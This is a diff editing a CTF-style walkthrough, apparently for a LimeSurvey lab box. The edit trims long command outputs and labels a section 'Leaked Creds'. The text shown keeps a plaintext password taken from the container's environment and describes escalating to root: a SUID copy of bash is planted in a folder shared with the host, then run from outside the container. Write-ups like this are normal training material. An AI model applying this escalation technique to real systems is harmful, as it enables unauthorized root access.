@@ -149,6 +149,7 @@ User limesvc may run the following commands on efaa6f5097ed:
 ```
 We run `script` to get a slightly better terminal shell and then enumerate our group membership and find we are a member of the sudoers group from inside the container, can run anything as `root`, but we don't yet have the password for this user yet.
 
+###### Leaked Creds (limesvc)
 ```zsh
 limesvc@efaa6f5097ed:/$ env
 env
@@ -166,19 +167,7 @@ PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
 APACHE_PID_FILE=/var/run/apache2/apache2.pid
 PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
 LIMESURVEY_PASS=5W5HN4K4GCXf9E
-PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
-LIMESURVEY_ADMIN=limesvc
-APACHE_RUN_GROUP=limesvc
-APACHE_LOCK_DIR=/var/lock/apache2
-SHLVL=1
-PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
-APACHE_RUN_DIR=/var/run/apache2
-APACHE_ENVVARS=/etc/apache2/envvars
-APACHE_RUN_USER=limesvc
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
-PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
-_=/usr/bin/env
+---SNIP---
 
 ```
 Looking at the stored env variables we see theres a `LIMESURVEY_PASS` variable.
@@ -235,26 +224,7 @@ findmnt
 TARGET                  SOURCE                     FSTYPE  OPTIONS
 /                       overlay                    overlay rw,relatime,lowerdir=
 |-/proc                 proc                       proc    rw,nosuid,nodev,noexe
-| |-/proc/bus           proc[/bus]                 proc    ro,nosuid,nodev,noexe
-| |-/proc/fs            proc[/fs]                  proc    ro,nosuid,nodev,noexe
-| |-/proc/irq           proc[/irq]                 proc    ro,nosuid,nodev,noexe
-| |-/proc/sys           proc[/sys]                 proc    ro,nosuid,nodev,noexe
-| |-/proc/sysrq-trigger proc[/sysrq-trigger]       proc    ro,nosuid,nodev,noexe
-| |-/proc/acpi          tmpfs                      tmpfs   ro,relatime,inode64
-| |-/proc/kcore         tmpfs[/null]               tmpfs   rw,nosuid,size=65536k
-| |-/proc/keys          tmpfs[/null]               tmpfs   rw,nosuid,size=65536k
-| |-/proc/latency_stats tmpfs[/null]               tmpfs   rw,nosuid,size=65536k
-| |-/proc/timer_list    tmpfs[/null]               tmpfs   rw,nosuid,size=65536k
-| -/proc/scsi          tmpfs                      tmpfs   ro,relatime,inode64
-|-/dev                  tmpfs                      tmpfs   rw,nosuid,size=65536k
-| |-/dev/pts            devpts                     devpts  rw,nosuid,noexec,rela
-| |-/dev/mqueue         mqueue                     mqueue  rw,nosuid,nodev,noexe
-| -/dev/shm            shm                        tmpfs   rw,nosuid,nodev,noexe
-|-/sys                  sysfs                      sysfs   ro,nosuid,nodev,noexe
-| |-/sys/firmware       tmpfs                      tmpfs   ro,relatime,inode64
-| -/sys/fs/cgroup      cgroup                     cgroup2 ro,nosuid,nodev,noexe
-|-/etc/resolv.conf      /dev/root[/var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/resolv.conf]
-|                                                  ext4    rw,relatime,discard,e
+---SNIP---
 |-/etc/hostname         /dev/root[/var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hostname]
 |                                                  ext4    rw,relatime,discard,e
 |-/etc/hosts            /dev/root[/var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hosts]
@@ -289,23 +259,7 @@ total 1.4M
 4.0K drwxr-xr-x  15 limesvc  limesvc  4.0K Nov 27  2023 application
 4.0K drwxr-xr-x  10 limesvc  limesvc  4.0K Nov 27  2023 assets
 1.2M -rwsr-sr-x   1 root     root     1.2M Nov  5 20:46 bash
-4.0K drwxr-xr-x   7 limesvc  limesvc  4.0K Nov 27  2023 docs
-8.0K -rw-rw-r--   1 limesvc  limesvc  8.0K Nov 27  2023 gulpfile.js
-8.0K -rw-rw-r--   1 limesvc  limesvc  5.5K Nov 27  2023 index.php
-4.0K drwxr-xr-x   4 limesvc  limesvc  4.0K Nov 27  2023 installer
-4.0K drwxr-xr-x 120 limesvc  limesvc  4.0K Nov 27  2023 locale
-4.0K drwxr-xr-x   4 limesvc  limesvc  4.0K Nov 27  2023 modules
-4.0K drwxr-xr-x  23 limesvc  limesvc  4.0K Nov 27  2023 node_modules
- 12K -rwxrwxr-x   1 limesvc  limesvc  9.5K Nov 27  2023 open-api-gen.php
-4.0K drwxr-xr-x   3 limesvc  limesvc  4.0K Nov 27  2023 plugins
-4.0K -rw-rw-r--   1 limesvc  limesvc  2.2K Nov 27  2023 psalm-all.xml
-4.0K -rw-rw-r--   1 limesvc  limesvc  1.1K Nov 27  2023 psalm-strict.xml
-4.0K -rw-rw-r--   1 limesvc  limesvc  1.1K Nov 27  2023 psalm.xml
-4.0K -rw-rw-r--   1 limesvc  limesvc  1.7K Nov 27  2023 setdebug.php
-4.0K drwxr-xr-x   5 limesvc  limesvc  4.0K Nov 27  2023 themes
-4.0K drwxr-xr-x   6 limesvc  limesvc  4.0K Nov  5 20:32 tmp
-4.0K drwxr-xr-x   9 limesvc  limesvc  4.0K Nov 27  2023 upload
-4.0K drwxr-xr-x  36 limesvc  limesvc  4.0K Nov 27  2023 vendor
+---SNIP---
 ```
 First we start by gaining a root shell inside the container as `root` with `sudo -i`. We then navigate over to `/var/www/html/survey` and copy `/bin/bash` inside that folder. We then add a SUID permissions bit to it with `chmod +s /var/www/html/survey/bash`.
 #### Shell as root on main filesystem
@@ -322,24 +276,9 @@ total 1.4M
 4.0K drwxr-xr-x  15 limesvc limesvc 4.0K Nov 27  2023 application
 4.0K drwxr-xr-x  10 limesvc limesvc 4.0K Nov 27  2023 assets
 1.2M -rwsr-sr-x   1 root    root    1.2M Nov  5 20:46 bash
-4.0K drwxr-xr-x   7 limesvc limesvc 4.0K Nov 27  2023 docs
-8.0K -rw-rw-r--   1 limesvc limesvc 8.0K Nov 27  2023 gulpfile.js
-8.0K -rw-rw-r--   1 limesvc limesvc 5.5K Nov 27  2023 index.php
-4.0K drwxr-xr-x   4 limesvc limesvc 4.0K Nov 27  2023 installer
-4.0K drwxr-xr-x 120 limesvc limesvc 4.0K Nov 27  2023 locale
-4.0K drwxr-xr-x   4 limesvc limesvc 4.0K Nov 27  2023 modules
-4.0K drwxr-xr-x  23 limesvc limesvc 4.0K Nov 27  2023 node_modules
- 12K -rwxrwxr-x   1 limesvc limesvc 9.5K Nov 27  2023 open-api-gen.php
-4.0K drwxr-xr-x   3 limesvc limesvc 4.0K Nov 27  2023 plugins
-4.0K -rw-rw-r--   1 limesvc limesvc 2.2K Nov 27  2023 psalm-all.xml
-4.0K -rw-rw-r--   1 limesvc limesvc 1.1K Nov 27  2023 psalm-strict.xml
-4.0K -rw-rw-r--   1 limesvc limesvc 1.1K Nov 27  2023 psalm.xml
-4.0K -rw-rw-r--   1 limesvc limesvc 1.7K Nov 27  2023 setdebug.php
-4.0K drwxr-xr-x   5 limesvc limesvc 4.0K Nov 27  2023 themes
-4.0K drwxr-xr-x   6 limesvc limesvc 4.0K Nov  5 20:32 tmp
-4.0K drwxr-xr-x   9 limesvc limesvc 4.0K Nov 27  2023 upload
-4.0K drwxr-xr-x  36 limesvc limesvc 4.0K Nov 27  2023 vendor
+---SNIP---
 ```
+
 Jumping back over to our SSH session on the main filesystem we can see that we successfully copied bash and made it a SUID binary with `root` as its owner.
 
 ```zsh
